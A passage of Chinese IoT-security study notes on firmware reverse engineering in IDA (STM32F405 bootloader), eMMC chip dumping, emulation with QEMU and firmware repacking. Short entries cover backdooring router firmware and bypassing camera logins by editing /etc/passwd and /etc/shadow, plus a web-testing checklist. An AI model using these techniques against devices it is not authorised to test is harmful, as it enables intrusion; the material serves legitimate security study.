的固件。在这种情况下，你需要考虑其他策略来分析固件。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-12.png" alt="images\667-12.png" /></a><br />数据表<br />如果你能得到数据表，只恭喜你，你的分析基本上就算成功了。不要低估一个不错的数据表的价值。数据表可能会包含 1000 多页的编程以及核心处理器的内容。<br />有时数据表是不公开的，有时是被加密的，有时它们是放在芯片制造商的官方网站上，下载即可。用于查找数据表的资源可能是：<br /><strong>·</strong>Google：没有什么比 Google 更好的搜索引擎了。<br /><strong>·</strong>类似 Yandex.ru 的网站：Yandex 是俄罗斯网络拥有用户最多的网站，不要低估非英语搜索引擎和论坛的威力。<br /><strong>·</strong>Alibaba：大部分芯片在这里有卖的，一些列表将链接到你可能无法在其他任何地方找到的数据表，你也可以通过直接与供应商交谈来获取数据表。<br />如果找不到数据表，至少需要找到入口点和固件应加载的地址。你可以通过谷歌搜索、阅读论坛、阅读源代码或其他一些意想不到的角落找到答案。如果你的目标芯片有工具链，那么其中也可能有源代码，这也可能导致你朝着正确的方向前进。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-13.png" alt="images\667-13.png" /></a><br />将裸机二进制文件加载到 IDA 中<br />分析裸机时，IDA 仍然是最有用的 (也是最通用的) 逆向分析程序。关于如何使用裸机二进制文件，相关文章很多。但是，通常情况下，分析裸机二进制文件时，你需要知道加载地址和入口点。<br />加载地址是正在执行二进制文件的内存中的地址，入口点是处理器开始执行的二进制文件中的位置。<br />同样，你需要记住正在分析的固件的环境，了解内核及其特性对分析会有很大帮助。如果你正在查看运行在 Cortex-M 上的某些内容，你可能会发现自己非常熟悉的 infocenter.arm.com 网站。<br />以下，我将使用裸机 ARM 二进制文件为例进行说明，因为裸机 ARM 非常常见。<br />让我们看看 STM32F405 的系统引导加载程序，如果你已经提前安装好了，就可以无拘无束的进行内存访问了。由于 STM32 数据表都是在线的发布的，所以我们可以通过 google 找到 STM32F405 的数据表。<br /><a href="https://img.chainnews.com/material/images/bd5860e37017348884b3630793c46203.jpg-article"><img src="images\667-14.png" alt="images\667-14.png" /></a><br />数据表显示，引导加载程序位于“系统内存”中，但具体是在哪里？<br /><a href="https://img.chainnews.com/material/images/ddd074a893176753c86b6f62be9323f1.jpg-article"><img src="images\667-15.png" alt="images\667-15.png" /></a><br />根据上图的提示，系统内存位于 0x1fff0000。<br />因此，将 0x1fff0000 到 0x1fff77ff 之间的所有内存逆向分析到一个文件之后，我们就可以进行一些快速的完整性检查，顺带检查一下里面有没有字符串。<br />$ strings -n5 stm32f405.bin<br />s F<br />1`hC1 hA<br />rAh<br />CA`b{<br />pGZHJ<br />!1Ccs<br />[…snip…]<br />a<code>hK!Aa</code>h<br />QAarH@h<br />h@$@!<br />beta1<br />相当多字符串都是无用的，只有以下的这些对分析有用。<br />$ strings -el stm32f405.bin<br />@Internal Flash /0x08000000/04<em>016 Kg,01</em>064 Kg,07*128 Kg<br />@OTP Memory /0x1FFF7800/01<em>512 e,01</em>016 e<br />@Option Bytes /0x1FFFC000/01*016 e<br />@Device Feature/0xFFFF0000/01*004 e<br />STMicroelectronics<br />STM32 BOOTLOADER<br />STM32F2STM32<br />&quot;11<br />我们还可以检查代码编译的目的是什么，以及什么是字节顺序。为此，我们可以再次使用 binwalk。<br />binwalk 有一个内置的操作码扫描器，它使用-Y 标志激活。它不执行常规的 binwalk 魔术字节扫描活动。相反，它只是使用 Capstone 引擎检查所有主要体系结构的有效指令并报告它找到的内容，包括有多少连续有效指令，体系结构和字节顺序。如果你只想对正在查看的某些固件进行快速的检查，这是非常有用的。<br />以下显示的就是 binwalk 运行在一个 STM32F405 引导加载程序的过程：<br />$ binwalk -Y stm32f405.bin<br />DECIMAL HEXADECIMAL DESCRIPTION<br />--------------------------------------------------------------------------------<br />0 0x0 ARM executable code, 16-bit (Thumb), little<br />endian, at least 1079 valid instructions<br />但是，需要注意的是，binwalk<br />-Y 只是负责检查文件是否包含有效字节码的一种简单方法。它没有告诉你任何关于固件本身的有用信息，只会告诉你里面有没有有效的字节码。<br />唯一的有用信息是让我们知道，字节码是从偏移量 0 处开始的，Capstone 引擎可以将字节读取为有效的 LITTLE-ENDIAN （低字节序） Thumb 代码。本示例中，我们得到了 1079 条有效指令，这是相当多的代码。然后，我们可以将这个逆向分析装载到 IDA 中。<br />译者注：Capstone 是一个轻量级的多平台多架构支持的逆向分析框架。支持包括 ARM，ARM64，MIPS 和 x86/x64 平台。<br />LITTLE-ENDIAN （小字节序、低字节序）, 即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端，与之对应的是：BIG-ENDIAN （大字节序、高字节序）。<br />在 IDA 中打开文件，你将看到常用的弹出窗口。此时 IDA 不会为你解决任何问题，因此你需要将“处理器类型”更改为“ARM Little-endian<br />[ARM]”，然后单击“设置”。<br /><a href="https://img.chainnews.com/material/images/36e5769a3f82b98cf826b6f3e8ce094a.jpg-article"><img src="images\667-16.png" alt="images\667-16.png" /></a><br />如果你想删除 ARM 代码，并且只使用 Thumb 代码，你可以执行以下操作：<br />点击“处理器选项”，弹出“ARM 特定选项”窗口。<br /><a href="https://img.chainnews.com/material/images/dd1a79ea08296cbc7c2314e913489743.jpg-article"><img src="images\667-17.png" alt="images\667-17.png" /></a><br />点击“编辑 ARM 架构选项”按钮：<br /><a href="https://img.chainnews.com/material/images/f5bc8571266fbdf978b3424d2d028ffd.jpg-article"><img src="images\667-18.png" alt="images\667-18.png" /></a><br />在“ARM 架构选项”窗口中，将“ARM 指令”设置为“否”。保留 Thumb 说明，按下“OK”“OK”“OK”，此时，IDA 将再次提示你，这次要求你配置内存。<br />由于我们已经知道引导加载程序的地址是 0x1FFF0000，因此我们可以在 ROM 起始地址字段中输入 0x1FFF0000。另外，我们还需要设置“加载地址”来反映这一点，所以你也应该把 0x1FFF0000 放在那里。<br /><a href="https://img.chainnews.com/material/images/4743f184ec7595557cc033793c0cbd55.jpg-article"><img src="images\667-19.png" alt="images\667-19.png" /></a><br />单击“OK”，可能会弹出一个小窗口，提示你可以使用 Alt+G 组合键在 ARM 和 Thumb 指令之间切换。有时候这也是一个很好的技巧，但不是很直观，我现在给你示范一下。<br />加载二进制文件后，如果单击一个地址（例如，在此示例中，它是 0x1FFF0000 处的二进制基数），然后按 Alt + G，将弹出“Segment<br />Register Value”窗口。<br /><a href="https://img.chainnews.com/material/images/19ce2421d5473da533a2014478fbeb48.jpg-article"><img src="images\667-20.png" alt="images\667-20.png" /></a><br />0x1 的“值”表示这一地址之后的代码 (0x1FFF0000) 将被视为 Thumb 代码，这意味着，ARM 处理器状态寄存器中的“T”标志，会将“T”标志设置为 1，以表示正在执行 Thumb 代码，并且标志 0 表示正在执行 ARM 代码。<br />注意：CODE16 也会放在那个地址中，其作用就是提示你。如果将它设置为 0x0，它将被视为 ARM 处理器状态。在这种情况下，CODE32 也将会放在那个地址中。<br />你可以稍后在文件中单击任何其他地址并将值设置为 0x0，并在该地址之后的代码将被视为 ARM。但无论如何，我们不希望这样做，我们希望所有内容都被视为 Thumb，所以它被设为 0x1。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-21.png" alt="images\667-21.png" /></a><br />入口点在哪里？<br /><a href="https://img.chainnews.com/material/images/9733f581deed6f5d9df1b2e881d81bed.jpg-article"><img src="images\667-22.png" alt="images\667-22.png" /></a><br />这一步，我们也要用到 IDA。<br />我们可以通过查看中断向量表来确定入口点，只需要知道表中的哪个元素是重置向量即可，因为重置向量就是我们的入口点。重置向量是当设备重置时，CPU 将开始执行代码的地址。<br />STM32F405 具有 Cortex-M4 内核，因此我们可以使用 Google 查找 Cortex-M4 向量表。在 Cortex-M4 设备通用用户指南中，我们可以发现以下内容。<br /><a href="https://img.chainnews.com/material/images/b91c0a80bc969f9ee0f17c85c201dc5d.jpg-article"><img src="images\667-23.png" alt="images\667-23.png" /></a><br />还有这个：<br /><a href="https://img.chainnews.com/material/images/9fdb1a6113d123641b8e70e48305039b.jpg-article"><img src="images\667-24.png" alt="images\667-24.png" /></a><br />这很有趣，让我们先记住它们。<br />这个有用的表显示偏移量 0x0 处的指针是初始堆栈指针位置，偏移量 0x4 处的指针是重置向量，偏移量 0x8 处的指针是不可掩码中断的，重置向量是处理器在启动时开始执行代码的地址。<br />在 IDA 中，我们可以将地址 0x0、0x4、0x8 等处的数据定义为“ DWORD”。DWORD 全称 Double<br />Word, 是指注册表的键值 , 每个 word 为 2 个字节的长度 ,DWORD<br />双字即为 4 个字节 , 每个字节是 8 位 , 共 32 位。右键单击地址 0x1FFF0000 处的字节，然后单击“ DWORD”，最后在 0x1FFF0004 处执行相同的操作。<br /><a href="https://img.chainnews.com/material/images/701bace843909ec6b4f4f0d64584aaae.jpg-article"><img src="images\667-25.png" alt="images\667-25.png" /></a><br />看看我们从下图中得到了什么，我自己也添加了评论。这些看起来很合理。0x0 偏移处的初始堆栈指针值指向一个 SRAM 的内存块。我们了解该内存块，是因为我们在数据表中读取了它。<br /><a href="https://img.chainnews.com/material/images/ce228d94054485298b82d803bcab039a.jpg-article"><img src="images\667-26.png" alt="images\667-26.png" /></a><br />重置向量 0x1FFF3DA1 也有意义，现在让我们跳到 IDA 中的那个位置。要么高亮显示并按下“Enter”，要么右键单击并选择“跳转到操作数”。<br /><a href="https://img.chainnews.com/material/images/76c3d029132206eb7c31ca25bae5a2a3.jpg-article"><img src="images\667-27.png" alt="images\667-27.png" /></a><br />请注意：在 Thumb 模式下，重置向量的最小有效位加了 1。所以，实际的重置向量要减去 1。<br /><a href="https://img.chainnews.com/material/images/483469d7eed816bbd7d3d2b0c11e52b7.jpg-article"><img src="images\667-28.png" alt="images\667-28.png" /></a><br />注意，此时 IDA“stripe”(在顶部) 完全是芥末色的，这意味着到目前为止文件中没有任何内容被定义。所以，我们的目的就是要对它们进行定义。<br />点击复位向量减 1 后的地址，按“C”，IDA 将开始逆向分析。<br /><a href="https://img.chainnews.com/material/images/e3d426028122c72085cbdcbbcd2c319e.jpg-article"><img src="images\667-29.png" alt="images\667-29.png" /></a><br />这看起来很合理，已经定义了许多子例程，所以在 IDA “stripe”中有相当多的蓝色。对于向量表中的其他惟一指针，继续相同的操作，你将看到更多的蓝色出现。<br /><a href="https://img.chainnews.com/material/images/920c0ef1ae56552cefe703db068ec81a.jpg-article"><img src="images\667-30.png" alt="images\667-30.png" /></a><br />现在，你可以开始了解固件复杂的内部工作原理。<br /><a href="https://img.chainnews.com/material/images/ec5c3a22f795c8cbd1ee534aa0917a40.jpg-article"><img src="images\667-31.png" alt="images\667-31.png" /></a><br />让我们快速地看一下这个子例程，以帮助你继续分析。在这个子例程中，你可以看到值 0x40023C04 被加载到 R0 中，然后 0x45670123 和 0xCDEF89AB 被依次写入 0x40023C04 的内存中。<br />图中红色突出显示的地址指的是将要访问的内存，它没有映射到 IDA 文件中。因此，当前 IDA 文件中没有映射 0x40023C04 的内存。其实你不需要映射它，但可能需要在数据表中查找它的用途。<br />通过查看 STM32F4 数据表，我们可以看到 0x40023C04 指的是 Flash 接口寄存器内存段中的某个地址。<br /><a href="https://img.chainnews.com/material/images/72751cc5010adc085cdc26d06e6ba10f.jpg-article"><img src="images\667-32.png" alt="images\667-32.png" /></a><br />并且 0x40023C00 基址的偏移量 0x4 指的是闪存密钥寄存器（FLASH_KEYR）：<br /><a href="https://img.chainnews.com/material/images/2fc7ab7135cd15a5291614d17d03c320.jpg-article"><img src="images\667-33.png" alt="images\667-33.png" /></a><br />可以看到，数据表中有 0x45670123 和 0xCDEF89AB 值，它们是解锁 Flash 控制寄存器的密钥。这就是这个子例程的作用。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-34.png" alt="images\667-34.png" /></a><br />IDA 脚本<br />在逆向分析期间，你可能会需要一些有用的 IDA 脚本，你可以在使用 IDA 中的嵌入式固件时使用它们。IDA<br />Python 嵌入式工具包就是比较著名的 IDA 脚本，它可以让固件的逆向分析变得更容易。但一般来说，在谷歌上搜索你正在使用的特定芯片可能会比使用脚本工具来得更直接高效一些，这会为你节省了很多时间。有很多特殊的代码，可以帮助你重新构建各种奇怪芯片的固件。<br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\667-35.png" alt="images\667-35.png" /></a><br />总结<br />本文讲了逆向分析的很多方法，但不管哪种方法，你都要先搞清楚你正在使用的固件的环境。不要什么都依赖 binwalk。如果有疑问，请使用不同的搜索引擎。最后，你要精通对十六进制字节的分析。</div><div class='page'><h1 class='title level-4'>下篇截图</h1><br/>下篇<br /><a href=""><img src="images\669-1.png" alt="images\669-1.png" /></a></div><div class='page'><h1 class='title level-2'>固件获取与提取</h1><br/>固件获取<br />官网或售后获取固件<br />从第三方网站或者专门的人获取固件<br />抓取升级包的地址<br />逆向升级软件获取升级接口<br />使用编程器从Flash中读取固件<br />通过调试接口, 进入设备提取固件<br />用逻辑分析仪获取信息<br />固件提取<br />strings<br />hexdump<br />file<br />binwalk<br />fdisk<br />dd<br />GUI hex<br /><br />xmind资料：<br /><a href="file://D:\CherryTreeNoteBook\技术思维导图\iot安全学习\通讯接口调试与固件提取.xmind">通讯接口调试与固件提取.xmind</a><br /></div><div class='page'><h1 class='title level-3'>固件获取</h1><br/><a href=""><img src="images\260-1.png" alt="images\260-1.png" /></a><br />相关资料：<a href="file://D:\CherryTreeNoteBook\技术思维导图\物联网安全\物联网安全15-固件获取.xmind">物联网安全15-固件获取</a>  <a href="file://D:\CherryTreeNoteBook\技术思维导图\iot安全学习\通讯接口调试与固件提取.xmind">通讯接口调试与固件提取</a><br /><br />通过在线升级获取固件，常使用http以及ftp协议<br /><a href=""><img src="images\260-2.png" alt="images\260-2.png" /></a><br />可以使用加密协议升级固件<br /><a href=""><img src="images\260-3.png" alt="images\260-3.png" /></a><br /><br />硬件固件获取主要思路<br />关于固件提取<br />	通过查询cpu芯片引脚，可以找到uart、spi、jtag、i2c等调试接口相关引脚，此时有两种思路<br />		1、直接使用探针（极细的连接口，可以与指定芯片引脚相连）连接cpu引脚，从而进行调试<br />		2、沿着特芯片引脚的走线，查看pcb板上有没有暴露出来的调试接口，如果无法从pcb班上直接看出电路走向，可能需要使用x光照相机，如果找到疑似接口，可以使用万用表测试其与cpu指定引脚的通断，如果通，则可能能够利用<br /><br />FlashROM<br />	FlashROM是一款开源的Flash固件提取项目，支持多种硬件平台，SPI Flash和Parallel Flash。</div><div class='page'><h1 class='title level-4'>emmc固件获取</h1><br/><a href="物联网安全--硬件--硬件组成--存储芯片--ROM--FLASH--EMMC--emmc.html">emmc相关知识</a><br /><br /><h1>读取方案1</h1><br /><a href="https://cloud.tencent.com/developer/news/410064">https://cloud.tencent.com/developer/news/410064</a><br />芯片吹下后，飞线连接特定引脚<br /><a href=""><img src="images\720-1.png" alt="images\720-1.png" /></a><br /><br />飞线连接读卡器<br /><a href=""><img src="images\720-2.png" alt="images\720-2.png" /></a><br /><br />读卡器插入电脑，可以使用diskgenius等工具读取内存分区，也可以使用Recover MyFiles 4.9.4.1324，数据恢复助手直接恢复<br /><a href=""><img src="images\720-3.png" alt="images\720-3.png" /></a><br /><br /><br /><h1>读取方案2</h1><br /><a href="https://zhuanlan.zhihu.com/p/70898877">https://zhuanlan.zhihu.com/p/70898877</a><br />在EMMC的接口协议中有个非常特别的设定，它可以向下兼容SD卡的接口协议<br /><br />~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br /><br />使用sd卡或tf卡读卡器飞线读取emmc<br />需要了解emmc、tf卡、sd卡的引脚定义从而飞线连接<br /><br />~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br /><br />使用u盘主控读取emmc，无需飞线，需要植球焊接<br /><a href=""><img src="images\720-4.png" alt="images\720-4.png" /></a><br />EMMC主控板网上很便宜，加个壳子才10多元，我们可以选择安国和NS1081，它们支持BGA162、221、153、169。使用安国主控板不需要开卡，但改造的U盘速度慢，和EMMC+SD读卡器相似；选择NS1081，需要很好的手工焊接技术，还需要开卡（开卡软件在U盘量产网可以下载），改造的U盘，速度相对更快，但发热量大。<br /><a href=""><img src="images\720-5.png" alt="images\720-5.png" /></a><br /><br />~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br /><br />emmc读卡器<br /><a href=""><img src="images\720-6.png" alt="images\720-6.png" /></a><br />EMMC读卡器，可读写、格式化、测试EMMC。缺点是，价格贵，一个EMMC读卡器只能适应一种EMMC<br /><br /><br /><br /><h1>读取方案3</h1><br /><a href="https://zhuanlan.zhihu.com/p/71244016">https://zhuanlan.zhihu.com/p/71244016</a><br />使用sd /tf卡读卡器读取emmc<br /><br />GLK CMD GND VCC DAT2 DAT1 DAT0 DAT3注意 图中VDD VDDF (红色)  即VCC，图中 Vss(蓝色)即GND<br /><a href=""><img src="images\720-7.png" alt="images\720-7.png" /></a>	<br /><br />对比实例,注意颜色与上图是对应的<br /><a href=""><img src="images\720-8.png" alt="images\720-8.png" /></a><br /><br />			<br />emmc针脚与tf卡针脚的对应关系，根据该关系，连接到tf读卡器的对应接口<br /><a href=""><img src="images\720-9.png" alt="images\720-9.png" /></a><br /><br /><a href="http://www.360doc.com/content/20/0712/21/32324300_923790821.shtml">http://www.360doc.com/content/20/0712/21/32324300_923790821.shtml</a><br />BGA153针脚定义<br /><a href=""><img src="images\720-10.png" alt="images\720-10.png" /></a><br /><br />非BGA153封装方式的emmc也是通过该8个引脚读取数据，途中也展示tf卡的针脚定义<br /><a href=""><img src="images\720-11.png" alt="images\720-11.png" /></a><br /><br />途中显示了sd卡的针脚定义，与tf卡相比仅多了个gnd脚，故对应读卡器也可以用于读取emmc<br /><a href=""><img src="images\720-12.png" alt="images\720-12.png" /></a><br /><br /><h1>读取方案4</h1><br /><a href="http://blog.itpub.net/69916320/viewspace-2662054/">http://blog.itpub.net/69916320/viewspace-2662054/</a><br />使用RT809H编程器读取emmc<br /><br />	eMMC芯片的读写需要用到的脚位是：VCC（或VDD）、VCCQ（或VDDF）、CMD、CLK、VSS（或GND）以及DAT0、DAT1、DAT2、DAT3、DAT4、DAT5、DAT6、DAT7数据接口。eMMC在线读写需要找到VCC/GND/CLK/CMD/D0至少5根线，VCC/GND这个最好找，<br />VCC 和VCCQ是eMMC的供电脚，VSS通常为线路板的GND地，CLK作为时钟信号，CMD作为双向命令和响应信号，DAT0-DAT7为数据传输接口，当使用烧录座以8BIT模式进行读写时会用到DAT0-DAT7共8个数据接口，使用RT809H编程器飞线读写时只需要用到DAT0（简称D0）数据接口，电源直接由主板供电，再飞线CMD、CLK即可。<br /><a href=""><img src="images\720-13.png" alt="images\720-13.png" /></a><br /><br />RT809H侧面存在emmc转ttl接口<br />使用RT809H编程器飞线读写时只需要用到DAT0（简称D0）数据接口，电源直接由主板供电，再飞线CMD、CLK即可。<br /><a href=""><img src="images\720-14.png" alt="images\720-14.png" /></a><br /><br /><br />	如果您已经有了线路板相应的飞线点位图，只需要按图示用飞线CMD、CLK、D0、GND到编程器相应接口，特别注意飞线不宜过长，在10CM以内最好，减少损耗和干扰以保障读写成功率。然后断开点位处与其它线路相连的电阻，断电阻的目的是避免其它线路对数据读写产生影响，飞线让编程器直接与eMMC芯片相关引脚相连。接下来还需要将主芯片晶振短接到地，让主芯片停止工作，避免干扰与影响。最后给主板通电，这样前面提到的eMMC芯片的VCC和VCCQ都会直接由主板电源供电。如果以上操作无误，我们在软件界面输入eMMC_AUTO_ISP会识别到eMMC芯片的ID和相关参数，就可以正常操作读取或写入。假如您没有点位图，也可以拆下eMMC芯片根据引脚在PCB板的位置找到对应的点位，再焊回eMMC芯片按上述方法飞线后再操作读写即可。<br /><a href=""><img src="images\720-15.png" alt="images\720-15.png" /></a><br /><br /><br />如果没有这些条件，可以按以下方法查找：在eMMC芯片附近查看整排的0到数十欧电阻和信号线。CLK在PCB上有特征，通常有一个串联的小电阻，部分板子还有个空的电容焊盘，一般没有上拉电阻。CLK在eMMC上电初始化时就有几百KHZ的时钟信号出现，有数据通讯时则会出现数十M的时钟信号，用示波器或者频率计可以看出来；CMD/D0一般都有上拉电阻，CMD在eMMC上电初始化时就有几百KHZ的数据波形出现，用示波器或者频率计可以看出来；而D0在初始化时没有那么多的数据波形，这些信号里也就D0稍微难找一点。一般在数据口8个上拉电阻的最边上，多试几次就行部分板卡的3.3V供电不仅要供给eMMC，同时还供给了其他芯片，耗电量较大时，请使用原机的3.3V或者外接3.3V单独供电，这点与手机等低功耗产品有一些不同。<br /><a href=""><img src="images\720-16.png" alt="images\720-16.png" /></a><br /><br /><br /><h1>读取方案5</h1><br /><a href="http://www.ifix.net.cn/thread-60562-1-1.html">http://www.ifix.net.cn/thread-60562-1-1.html</a><br />使用RT809H不吹下emmc情况下进行读写<br />要使主芯片停止工作，（供电，时钟，复位）最容易的是晶振，把主芯片的晶振X0R2(在屏线排插傍边)的两个引脚接地<br /><a href=""><img src="images\720-17.png" alt="images\720-17.png" /></a><br /><br />找到EMMC  的几个关键引脚测试点  DO  CMD    CLK    GND  最少4根线，而且线的超度不要超过10cm.<br /><a href=""><img src="images\720-18.png" alt="images\720-18.png" /></a><br /><br />我只接了四根，EMMC的POWER 用板子自己的供电，所以少了一根，给板子接上12V的供电就可以了。<br /><a href=""><img src="images\720-19.png" alt="images\720-19.png" /></a><br /><br />给液晶主板加上12V的供电，打开编程器的软件，选择EMMC_AUTO_ISP    点击读写就可以了<br /><a href=""><img src="images\720-20.png" alt="images\720-20.png" /></a><br /><br />打开RT809H编程器操作界面，点智能识别：EMMC ISP。点设置，选择好读写分区和VCCQ，确定。点读取，选择存放位置，修改容易识别的文件名，点保存。<br /><a href=""><img src="images\720-21.png" alt="images\720-21.png" /></a><br /><br />读取到2%时点取消。点擦除，提示：写入前软件会自动擦除EMMC对应区域，是否需要手动擦除EMMC所有区域的数据？点确定，开始擦除数据，稍后提示擦除成功。<br /><a href=""><img src="images\720-22.png" alt="images\720-22.png" /></a><br /><br />点写入，选择文件路径，双击任意一个文件开始写入。写入2%时点取消。拔掉ISP线，连接RX、TX查看打印信息，设置好RT809H，取消晶振短接线，打开SecureCRT并连接，主板上电，查看到引导是否写入正确。关闭主板电路，插入厂家升级文件到USB端口。按住Enter键，主板上电，直到出现控制台。<br />在控制台下输入cu后回车。自动识别到升级文件，开始升级，耐心等待升级过程<br /><a href=""><img src="images\720-23.png" alt="images\720-23.png" /></a><br /><br /><br />EMMC_AUTO_ISP飞线读写，一定要让主芯片停止工作，读写成功率才高，方法有：断供电、短接主芯片的晶振2个脚到地、复位脚加电平强制复位。最简单的方法是：短接主芯片晶振的2个脚到地，使用原机的供电，VCCIO电压与EMMC供电一致，飞4根线(CLK/CMD/D0/GND)读写。</div><div class='page'><h1 class='title level-5'>成功读取实例</h1><br/><h1>case1</h1><br />case1：将emmc植球焊接到读取器上 <br /><a href=""><img src="images\722-1.png" alt="images\722-1.png" /></a><br />	<br />插入电脑使用DiskInternals Linux Reader 国外免费软件读取，软件实现了windows上读取linux文件系统<br /><a href=""><img src="images\722-2.png" alt="images\722-2.png" /></a><br /><br /><br /><h1>case2</h1><br />case2：热风枪得到emmc，其引脚独特<br /><a href=""><img src="images\722-3.png" alt="images\722-3.png" /></a><br /><br />钢网对准芯片引脚，将焊锡膏涂抹在上面，使用热风枪吹，从而让芯片每个引脚都被植锡<br /><a href=""><img src="images\722-4.png" alt="images\722-4.png" /></a><br /><br />热风枪吹焊锡<br /><a href=""><img src="images\722-5.png" alt="images\722-5.png" /></a><br /><br />吹完后，芯片引脚已上锡，之后需要涂抹助焊剂，上热风枪，从而使锡球归位<br /><a href=""><img src="images\722-6.png" alt="images\722-6.png" /></a><br />	<br />拆解sd卡的卡套，获得连接sd卡的引脚<br /><a href=""><img src="images\722-7.png" alt="images\722-7.png" /></a><br /><br />打磨卡套，从而将emmc芯片放入<br /><a href=""><img src="images\722-8.png" alt="images\722-8.png" /></a><br /><br />飞线连接指定芯片引脚<br /><a href=""><img src="images\722-9.png" alt="images\722-9.png" /></a><br /><br />将芯片连同卡托插进读卡器<br /><a href=""><img src="images\722-10.png" alt="images\722-10.png" /></a><br /><br />连接到电脑，直接读取<br /><a href=""><img src="images\722-11.png" alt="images\722-11.png" /></a></div><div class='page'><h1 class='title level-4'>资料：免拆芯片固件提取</h1><br/><a href="https://delikely.github.io/2021/01/11/%E5%85%8D%E6%8B%86%E8%8A%AF%E7%89%87%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6/">免拆芯片提取固件 (delikely.github.io)</a><br /><a href=""><img src="images\834-1.png" alt="images\834-1.png" /></a></div><div class='page'><h1 class='title level-4'>资料：免拆芯片提取固件在汽车中的应用</h1><br/><a href="https://mp.weixin.qq.com/s/EI9auxeFzL8BC96U5I4rKg">https://mp.weixin.qq.com/s/EI9auxeFzL8BC96U5I4rKg</a><br /><a href=""><img src="images\872-1.png" alt="images\872-1.png" /></a></div><div class='page'><h1 class='title level-3'>固件提取</h1><br/><a href=""><img src="images\261-1.png" alt="images\261-1.png" /></a><br />固件提取常用工具<br /><h3>Binwalk与BAT（Binary Analysis Toolkit）</h3>对比<br /><a href=""><img src="images\261-2.png" alt="images\261-2.png" /></a><br /><br />对于无法自动解压的固件，可以尝试以下方法分析：<br />1. 使用文件分析工具获得固件映像文件的基本数据类型。（file）<br />2. 使用字符串打印工具提取文件中所包含的明码字段，寻找是否有引导装载程序以及操作系统内核的信息。（strings）<br />3. 使用十六进制转储工具分析为了对齐固件文件空间分段而放入的连续填充字节，文件系统标识有可能紧跟其后。（hexdump）<br />4. 文件系统有可能使用非标准的特征符，如果发现可疑特征符字段，可以替换为标准特征符，再尝试由固件解压工具进行识别。</div><div class='page'><h1 class='title level-2'>固件模拟</h1><br/>固件模拟难点：程序运行需要硬件支持，模拟时缺少硬件<br /><a href=""><img src="images\251-1.png" alt="images\251-1.png" /></a><br /><a href="物联网安全--工具--qemu.html">qemu</a><br /><a href="物联网安全--固件--固件分析资料收集--OWASP固件安全分析手册--非官方译文.html#固件仿真">OWASP固件仿真</a></div><div class='page'><h1 class='title level-3'>单文件模拟</h1><br/>单文件模拟<br /><a href=""><img src="images\361-1.png" alt="images\361-1.png" /></a><br /><br />案例2<br />模拟路由器固件中提取的elf文件<br />关键命令<br /><h3>sudo chroot. ./qemu-mips-</h3><strong><h3>static</h3></strong><h3> bin/busybox</h3><br /><a href=""><img src="images\361-2.png" alt="images\361-2.png" /></a><br /></div><div class='page'><h1 class='title level-4'>固件模拟运行调试</h1><br/>使用qemu模拟运行固件中的二进制文件并且使用ida调试<br /><a href=""><img src="images\639-1.png" alt="images\639-1.png" /></a><br /><br />使用msf生成不重复字符串作为参数，使用qemu模拟运行固件中二进制文件，同时指定参数并调试<br /><a href=""><img src="images\639-2.png" alt="images\639-2.png" /></a></div><div class='page'><h1 class='title level-3'>系统模拟</h1><br/>使用fat脚本，如果运行失败，则使用原生firmadyne写脚本模拟运行<br /><a href=""><img src="images\362-1.png" alt="images\362-1.png" /></a><br /></div><div class='page'><h1 class='title level-2'>固件修改并重打包</h1><br/>通过修改固件内容可以绕过厂商设置的uart调试密码等机制，修改家用电视机主板固件中的用户信息，解决开机故障问题，如修改路由器固件，使低版本固件兼容高版本硬件。<br /><a href="物联网安全--工具--squashfs解压-压缩.html">压缩\解压squashfs文件系统</a><br /><a href="物联网安全--工具--dd.html">dd命令从固件中截取文件系统</a><br /><a href="物联网安全--工具--cat.html">使用cat命令将固件各个部分组合为新固件</a><br />注意修改后的固件需要与原固件大小和文件系统均相同，才能保证成功使用<br /><br />固件重打包除了使用fmk，还可以使用dd进行操作</div><div class='page'><h1 class='title level-3'>路由器固件添加后门并重打包</h1><br/>fmk固件修改并重打包<br /><a href=""><img src="images\640-1.png" alt="images\640-1.png" /></a></div><div class='page'><h1 class='title level-3'>绕过摄像头密码登录</h1><br/><a href="https://iot-security.wiki/hardware-security/modification/firmware.html">2.6.2 软改 · 物联网安全百科 (iot-security.wiki)</a><br />核心修改固件中/ect/passwd /etc/shadow目录，取消root账号命令  <a href="linux--linux敏感目录.html">linux敏感目录</a><br /><a href=""><img src="images\353-1.png" alt="images\353-1.png" /></a></div><div class='page'><h1 class='title level-2'>固件远程调试</h1><br/><a href="物联网安全--硬件--硬件调试--远程调试.html">固件远程调试</a></div><div class='page'><h1 class='title level-2'>交叉编译</h1><br/>arm和mips交叉编译环境<br /><a href=""><img src="images\360-1.png" alt="images\360-1.png" /></a><br /><br /><a href="汇编语言--mips--环境搭建与交叉编译.html">针对mips的交叉编译</a></div><div class='page'><h1 class='title level-2'>嵌入式web</h1><br/>看雪iot初级课程 - 嵌入式web<br />测试方向（资料来源OWASP固件分析手册）<br /><strong><h3>Web应用测试</h3></strong><br /><h3>以下是嵌入式设备的Web应用程序中要检查的特定区域：</h3><br /><strong><h3>· </h3></strong><h3>诊断和故障排除页面可能存在命令注入</h3><br /><strong><h3>· </h3></strong><h3>验证和授权方案对整个固件中的应用程序和操作系统平台的相同框架进行验证</h3><br /><strong><h3>· </h3></strong><h3>默认的用户名、密码</h3><br /><strong><h3>· </h3></strong><h3>在网页执行目录遍历或文件读取，以识别调试或测试功能</h3><br /><strong><h3>· </h3></strong><h3>在 SOAP/xml 和 API 传输中的输入检查 ，如：XSS 和 XXE</h3><br /><strong><h3>· </h3></strong><h3>跟踪观察应用程序中的参数查看异常点和堆栈溢出点</h3><br /><strong><h3>· </h3></strong><h3>针对常见的C / C ++漏洞针对嵌入式Web应用程序服务量身定做目标payload，例如内存损坏漏洞，格式字符串漏洞和整数溢出。</h3><br 